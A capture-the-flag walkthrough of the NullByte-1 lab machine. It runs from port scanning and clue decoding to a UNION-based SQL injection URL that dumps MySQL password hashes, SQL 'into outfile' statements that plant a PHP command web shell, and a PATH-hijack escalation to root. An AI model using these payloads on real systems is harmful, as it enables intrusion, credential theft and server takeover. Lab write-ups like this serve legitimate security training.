#NullByte-1 Workthrough#

Scan internal network for target ip address.  Finally, we find nullbyte ip address - 192.168.10.32.

## Scan Open Ports ##

```
┌─[lab@core]─[/tmp]
└──╼ nmap -v -n -A -p- 192.168.10.32

Starting Nmap 6.47 ( http://nmap.org ) at 2015-08-28 04:32 UTC
NSE: Loaded 118 scripts for scanning.
NSE: Script Pre-scanning.
Initiating Ping Scan at 04:32
Scanning 192.168.10.32 [2 ports]
Completed Ping Scan at 04:32, 0.00s elapsed (1 total hosts)
Initiating Connect Scan at 04:32
Scanning 192.168.10.32 [65535 ports]
Discovered open port 80/tcp on 192.168.10.32
Discovered open port 111/tcp on 192.168.10.32
Discovered open port 42151/tcp on 192.168.10.32
Discovered open port 777/tcp on 192.168.10.32
Completed Connect Scan at 04:32, 4.18s elapsed (65535 total ports)
Initiating Service scan at 04:32
Scanning 4 services on 192.168.10.32
Completed Service scan at 04:32, 11.01s elapsed (4 services on 1 host)
NSE: Script scanning 192.168.10.32.
Initiating NSE at 04:32
Completed NSE at 04:32, 0.17s elapsed
Nmap scan report for 192.168.10.32
Host is up (0.016s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-methods: GET HEAD POST OPTIONS
|_http-title: Null Byte 00 - level 1
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          42151/tcp  status
|_  100024  1          60595/udp  status
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
42151/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.38 seconds

```

## Vuln Analysis ##

```
| Port   | Ptotocol   | Description                            |
|:-------|:-----------|:---------------------------------------|
| 80     | tcp        | Apache httpd 2.4.10 (Debian)           |
| 111    | tcp        | rpcbind                                |
| 777    | tcp        | OpenSSH 6.7p1 Debian 5 (protocol 2.0)  |
| 42151  | tcp        | Status                                 | 
```

### HTTP ###

Access http://192.168.10.32:80/, we can view a picture and a message. "If you search for the laws of harmony, you will find knowledge."

1. **Scan web directory**

```
┌─[lab@core]─[/tmp]
└──╼ python wfuzz.py -c -z file,/opt/fuzzdb/discovery/web-dir-list.txt --hc 404 http://192.168.10.32/FUZZ/
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://192.168.10.32/FUZZ/
Total requests: 3932

==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

01576:  C=403     11 L	      32 W	    298 Ch	  ".htaccess"
01689:  C=403     11 L	      32 W	    294 Ch	  "icons"
01775:  C=403     11 L	      32 W	    299 Ch	  "javascript"
02526:  C=200     24 L	     324 W	   9115 Ch	  "phpmyadmin"
02747:  C=403     11 L	      32 W	    298 Ch	  ".htpasswd"
02922:  C=403     11 L	      32 W	    302 Ch	  "server-status"
03496:  C=200      6 L	      11 W	    113 Ch	  "uploads"

Total time: 9.983371
Processed Requests: 3932
Filtered Requests: 3925
Requests/sec.: 393.8549

```

try to access [phpmyadmin](http://192.168.10.32/phpmyadmin/) and [uploads](http://192.168.10.32/uploads/). Brute forece phpmyadmin with patator, but no result.


2. **Analysis Picture**

We need more, and download  http://192.168.10.32/main.gif. Analysis it with exiftool, we can see:

```
┌─[lab@core]─[/tmp]
└──╼ exiftool main.gif 
ExifTool Version Number         : 10.00
File Name                       : main.gif
Directory                       : .
File Size                       : 16 kB
File Modification Date/Time     : 2015:08:27 14:48:11+00:00
File Access Date/Time           : 2015:08:28 04:48:12+00:00
File Inode Change Date/Time     : 2015:08:28 04:48:12+00:00
File Permissions                : rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : url -> S0tLMG9hc3F3YXc=
Image Size                      : 235x302
Megapixels                      : 0.071
```

Woo, url is here.

```
┌─[lab@core]─[/tmp]
└──╼ printf S0tLMG9hc3F3YXc= | base64 -d
KKK0oasqwaw
```

open http://192.168.10.32/KKK0oasqwaw/, messages as follow:

```
Notices:

If you can understood the string, you can be to the next level.
It may be a name, a password , a url or something else.
-------------------------------------------------------------------------------------------------------------------------------------

MmUyZTJlMmUyMDJlMmUyZTJlMmQyMDJlMmQyZTIwMmQyZTJlMjAyZTJkMmQyMDJkMmQyZDJkMmQyMDJlMmQyZTIwMmQyZTJkMjA= 
```

decode the string, we can get:

```
┌─[lab@core]─[/tmp]
└──╼ printf MmUyZTJlMmUyMDJlMmUyZTJlMmQyMDJlMmQyZTIwMmQyZTJlMjAyZTJkMmQyMDJkMmQyZDJkMmQyMDJlMmQyZTIwMmQyZTJkMjA= | base64 -d 
2e2e2e2e202e2e2e2e2d202e2d2e202d2e2e202e2d2d202d2d2d2d2d202e2d2e202d2e2d20
┌─[lab@core]─[/tmp]
└──╼ printf MmUyZTJlMmUyMDJlMmUyZTJlMmQyMDJlMmQyZTIwMmQyZTJlMjAyZTJkMmQyMDJkMmQyZDJkMmQyMDJlMmQyZTIwMmQyZTJkMjA= | base64 -d | unhex 
.... ....- .-. -.. .-- ----- .-. -.- 
```

This is "Morse code". Decode it and get string "h4rdw0rk". What's the meaning ? 
- "It may be a name, a password , a url or something else."

we find url "http://192.168.10.32/KKK0oasqwaw/h4rdw0rk.php", enter "password". The page shows us "invalid key".


3. **Crack HTTP Form**

Choose your favorite tool to crack, For example: Burpsuite / Hydra.

The password is "password1".

If password is correct, page shows "Enter username".


4. **SQL Injection**

Enter username "'", 

```
http://192.168.10.32/KKK0oasqwaw/888search.php?usrtosearch='
```

Fetched data successfully 


Enter username '"',

```
http://192.168.10.32/KKK0oasqwaw/888search.php?usrtosearch="
```

Error Message: 

**Could not get data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%"' at line 1**


Finally, we can get mysql root user as follow:

```
http://192.168.10.32/KKK0oasqwaw/888search.php?usrtosearch=" union select 1,2,concat(user, 0x7c, password) from mysql.user-- #
```

we get username and password hash,

```
EMP ID :1
EMP NAME : ramses
EMP POSITION :
--------------------------------
EMP ID :2
EMP NAME : isis
EMP POSITION : employee
--------------------------------
EMP ID :1
EMP NAME : 2
EMP POSITION : root|*18DC78FB0C441444482C7D1132C7A23D705DAFA7
--------------------------------
EMP ID :1
EMP NAME : 2
EMP POSITION : debian-sys-maint|*BD9EDF51931EC5408154EBBB88AA01DA22B8A8DC
--------------------------------
EMP ID :1
EMP NAME : 2
EMP POSITION : phpmyadmin|*18DC78FB0C441444482C7D1132C7A23D705DAFA7
--------------------------------
Fetched data successfully 
```

crack the hash on site [hashkiller](http://www.hashkiller.co.uk/). 

```
root:sunnyvale
```

5. **Upload Backdoors**

login phpmyadmin with "root:sunnyvale", upload your php backdoor to uploads (/var/www/html/uploads) with sql query:

```
select "<?php phpinfo();?>" into outfile "/var/www/html/uploads/phpinfo.php";
select "<?php system($_GET[cmd]);?>" into outfile "/var/www/html/uploads/cmd.php" 
```

Get os shell with msf

```
www-data@NullByte:/var/www/backup$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@NullByte:/var/www/backup$ PATH="/var/www/backup:$PATH"
www-data@NullByte:/var/www/backup$ echo $PATH
/var/www/backup:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@NullByte:/var/www/backup$ ln -s /bin/sh ps
www-data@NullByte:/var/www/backup$ ./procwatch
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# cd /root
# ls -l
total 4
-rw-r--r-- 1 root root 1170 Aug  2 01:45 proof.txt
# cat proof.txt
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats. 
Now you done that I wanna talk with you. Write a walk & mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
-----END PGP PUBLIC KEY BLOCK-----

```

